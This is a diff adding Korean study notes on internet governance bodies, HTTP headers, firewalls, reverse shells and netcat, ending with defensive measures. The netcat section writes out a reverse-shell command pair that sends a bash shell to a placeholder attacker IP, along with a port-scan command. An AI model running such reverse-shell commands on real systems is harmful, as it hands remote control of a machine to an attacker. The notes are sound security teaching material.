+  <li><strong>인터넷할당번호관리기관(IANA)</strong> — 인터넷 초기에 사용자들에게 인터넷 주소를 할당하기 위해 국방정보청(DISA)이 만들었으며, 현재는 인터넷소사이어티(ISOC) 산하 기관이다.</li>
+  <li><strong>인터넷소사이어티(Internet Society, ISOC)</strong>
+    <ul>
+      <li><strong>IETF</strong>: 인터넷의 운영·관리·개발에 대해 협의하고 프로토콜과 구조적인 사안을 분석하는 인터넷 표준화 기구</li>
+      <li><strong>IESG</strong>: 인터넷의 기술적인 문제를 해결할 목적으로 설립된, 인터넷 아키텍처 위원회 하부 조직</li>
+      <li><strong>IAB</strong>: 인터넷소사이어티의 감독 단체로, 인터넷의 방침이나 장기적인 기획 및 기술 정책 등을 심의하고 결정</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>우리가 사용하는 도메인 네임, IP 주소 등은 ICANN에서 관리하며 원래는 무료로 등록할 수 있다. 다만 보통은 직접 하기 어려워, 비용을 받고 이를 도와주는 서비스가 통신사 서비스다.</blockquote>
+<blockquote>한국은 땅이 작다 보니 인터넷 망을 전국에 깔기 쉽고, 그 덕분에 IT 관련 표준화를 하기에 적합하다 — 한국이 인터넷 강국이라 불리는 이유다.</blockquote>
+
+<h4>HTTP 기본 개념</h4>
+<ul>
+  <li><strong>Cookie</strong>: 웹 브라우저가 동일한 웹 서버에 다시 요청할 때 HTTP 헤더에 담아 전송하는 데이터 조각
+    <ul>
+      <li><strong>SSID(Session SID)</strong>: 실제 Cookie 값. 웹 서버가 사용자의 브라우저 세션을 안전하게 식별하고, 현재 로그인 상태를 유지하기 위해 발급하는 보안 세션 ID</li>
+    </ul>
+  </li>
+  <li><strong>Connection: Keep-Alive</strong>: HTTP는 TCP 프로토콜을 사용하므로 연결을 끊었다가 다시 연결하려면 또 3-way handshake 과정을 거쳐야 한다. 너무 비효율적이기 때문에 Keep-Alive 설정으로 연결을 유지한다.</li>
+  <li><strong>User-Agent</strong>: 접속한 대상의 소프트웨어 및 기기 정보</li>
+</ul>
+<blockquote>요청(request) 헤더 정보는 임의로 수정해서 보낼 수 있다.</blockquote>
+<p>터미널에서 직접 HTTP 요청을 보내 확인해볼 수도 있다(<code>nc</code> 이용).</p>
+
+<h3>방화벽</h3>
+<ul>
+  <li>인바운드(Inbound)만 막고 아웃바운드(Outbound)는 거의 막지 않는 경우가 많다</li>
+  <li>보안이 중요한 직군(은행 등)에서는 아웃바운드도 막기도 한다</li>
+</ul>
+
+<h4>화이트리스트</h4>
+<p>서버에서 안전하다고 등록된 특정 IP 주소나 도메인만 접속을 허용하는 방식이다. 예를 들어 서버의 22번 포트가 열렸을 때 무작위 대입 공격을 막기 위해 방화벽에 22번에 대한 접속을 전부 차단하는 규칙을 넣고, 개발자 주소인 특정 IP만 허용할 때 화이트리스트를 사용한다.</p>
+
+<h3>리버스쉘</h3>
+<p>피해자(대상) 컴퓨터가 반대로 공격자의 컴퓨터에 먼저 접속을 시도하여, 공격자가 원격으로 시스템 명령을 내릴 수 있게 만드는 연결 방식이다.</p>
+
+<h4>핵심 원리</h4>
+<ul>
+  <li><strong>방화벽의 비대칭성</strong>: 네트워크 방화벽이 인바운드 연결은 엄격하게 막는 반면, 아웃바운드 연결은 업데이트나 웹 서핑 허용을 위해 비교적 너그럽게 열어둔다는 것을 이용한다</li>
+  <li><strong>우회 방식</strong>: 리버스쉘은 피해자 시스템이 외부(공격자)로 나가는 아웃바운드 연결을 이용하므로 방화벽을 쉽게 뚫을 수 있다</li>
+</ul>
+<blockquote>방화벽에서 막기 힘들기 때문에 방어가 번거롭다. 악성 스크립트를 막기 위해 확장자 검사를 철저하게 해야 한다.</blockquote>
+
+<h4>작동 순서</h4>
+<ol>
+  <li><strong>순서대기(Listen)</strong>: 공격자가 자신의 컴퓨터에서 특정 포트를 열고 대기</li>
+  <li><strong>접속(Connect)</strong>: 취약점에 걸린 피해자 컴퓨터가 악성 스크립트를 통해 공격자의 IP와 포트로 접속</li>
+  <li><strong>제어(Control)</strong>: 연결이 성공하면 공격자는 피해자 컴퓨터의 명령어 창(Shell)을 얻어 원격 제어를 시작</li>
+</ol>
+
+<h3>넷캣(Netcat, nc)</h3>
+<p>네트워크 읽기 및 쓰기를 지원하는 강력한 유틸리티다.</p>
+
+<h4>보안상 위험성</h4>
+<ul>
+  <li>넷캣은 인증이나 암호화 기능이 없어, 악용될 경우 시스템에 치명적인 보안 취약점을 만든다</li>
+  <li><strong>손쉬운 리버스쉘 생성</strong>: 공격자 컴퓨터에서 대기하고, 피해자 컴퓨터에서 접속 명령 한 줄만 실행하면 원격 제어 권한이 넘어간다</li>
+  <li><strong>백도어 유지</strong>: 시스템 내부에서 특정 포트를 상시 열어두는 백도어(Backdoor) 프로그램으로 쉽게 악용된다</li>
+  <li><strong>보안 우회</strong>: 데이터가 암호화되지 않고 평문(Plaintext)으로 전송되지만, 단순한 텍스트 흐름이어서 일부 구형 침입 탐지 시스템(IDS)을 우회하기도 한다</li>
+</ul>
+<pre><code># 공격자 컴퓨터: 대기
+nc -lvp 4444
+
+# 피해자 컴퓨터: 접속과 동시에 셸 실행 (-e 옵션)
+nc &lt;공격자 IP&gt; 4444 -e /bin/bash</code></pre>
+
+<h4>보안 진단 및 방어 활용</h4>
+<p>보안 관리자는 시스템의 취약점을 점검하고 방어 체계를 구축할 때 넷캣을 유용하게 사용할 수 있다.</p>
+<ul>
+  <li><strong>포트 스캔(Port Scanning)</strong>: 외부로 열려 있는 취약한 포트가 있는지 빠르게 확인
+    <pre><code>nc -zv 대상IP 1-1024</code></pre>
+  </li>
+  <li><strong>배너 그래빙(Banner Grabbing)</strong>: 특정 포트에 접속하여 실행 중인 서비스의 이름과 버전 정보를 수집, 취약점 유무를 판단</li>
+  <li><strong>방화벽 규칙 검증</strong>: 특정 아웃바운드 포트가 실제로 막혀 있는지, 인바운드 정책이 잘 작동하는지 테스트</li>
+</ul>
+
+<h4>Netcat 악용 방어 대책</h4>
+<ul>
+  <li><strong>-e 옵션 제거(Traditional 버전 금지)</strong>: 가장 위험한 기능인 '실행 후 연결(<code>-e</code>, <code>--exec</code>)' 옵션이 제거된 <code>netcat-openbsd</code> 버전을 사용해야 한다. 최신 리눅스 배포판은 대부분 이 옵션이 빠진 버전을 기본 제공한다.</li>
+  <li><strong>애플리케이션 화이트리스트</strong>: 서버 내부에서 <code>nc</code> 명령어가 아예 실행되지 않도록 실행 권한을 제한하거나 삭제한다</li>
+  <li><strong>아웃바운드 방화벽 강화</strong>: 80(HTTP), 443(HTTPS) 등 필수 포트를 제외한 나머지 포트로 나가는 모든 아웃바운드 트래픽을 차단한다</li>
+  <li><strong>네트워크 모니터링</strong>: 지속적으로 외부 특정 IP와 대량의 데이터를 평문으로 주고받는 비정상적인 커넥션을 탐지한다(SIEM, IDS/IPS 활용)</li>
+</ul>
